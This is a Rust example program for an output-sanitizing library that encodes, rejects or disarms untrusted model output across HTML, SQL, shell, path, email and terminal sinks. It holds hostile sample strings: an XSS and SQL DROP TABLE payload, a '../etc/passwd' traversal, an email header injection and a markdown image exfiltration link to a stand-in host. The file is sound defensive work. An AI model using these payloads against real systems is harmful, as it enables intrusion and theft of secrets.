//! Focused walkthrough of `aegis-output`: context-aware sink encoding, control-char stripping,
//! schema validation, and render-time exfil neutralization.
//!
//! Run it:
//! ```bash
//! CARGO_TARGET_DIR=/tmp/aegis-target cargo run -p aegis-output --example output_sinks
//! ```

use aegis_output::{encode, neutralize_exfil, strip_control, strip_query, validate, Sink};

fn main() {
    // The same hostile string is inert in every sink — encoded differently for each context.
    let payload = "<img src=x onerror=alert(1)>'; DROP TABLE t;--";
    println!("raw model output : {payload}\n");
    for sink in [Sink::Html, Sink::Sql, Sink::Shell] {
        match encode(sink, payload) {
            Ok(safe) => println!("  {sink:?}: {safe}"),
            Err(e) => println!("  {sink:?}: rejected ({e})"),
        }
    }

    // Path and Email sinks *reject* dangerous values rather than encoding them.
    println!(
        "\npath  '../etc/passwd' : {:?}",
        encode(Sink::Path, "../etc/passwd").is_ok()
    );
    println!(
        "path  'report.pdf'    : {:?}",
        encode(Sink::Path, "report.pdf").is_ok()
    );
    println!(
        "email header injection: {:?}",
        encode(Sink::Email, "a@b.com\r\nBcc: evil@x").is_ok()
    );

    // Terminal/log sink: strip ANSI/OSC/BEL so output can't repaint the screen or hide text.
    let ansi = "normal\u{1b}[2J\u{1b}[31mHIDDEN\u{07}";
    println!("\nbefore strip_control : {ansi:?}");
    println!("after  strip_control : {:?}", strip_control(ansi));

    // Schema validation in trusted code.
    let schema = serde_json::json!({
        "type": "object",
        "properties": { "action": { "enum": ["approve", "deny"] } },
        "required": ["action"], "additionalProperties": false
    });
    println!(
        "\nvalidate {{action:approve}} : {}",
        validate(&schema, &serde_json::json!({"action":"approve"})).is_ok()
    );
    println!(
        "validate {{action:hack}}    : {}",
        validate(&schema, &serde_json::json!({"action":"hack"})).is_ok()
    );

    // Render-time exfil neutralization.
    let md = "hi ![x](https://evil.example/p?leak=SECRET) and <iframe src=y>";
    let n = neutralize_exfil(md);
    println!("\nneutralize_exfil     : {}", n.content);
    println!("constructs disarmed  : {}", n.neutralized);
    println!(
        "strip_query          : {:?}",
        strip_query("https://evil.example/p?leak=SECRET")
    );
}
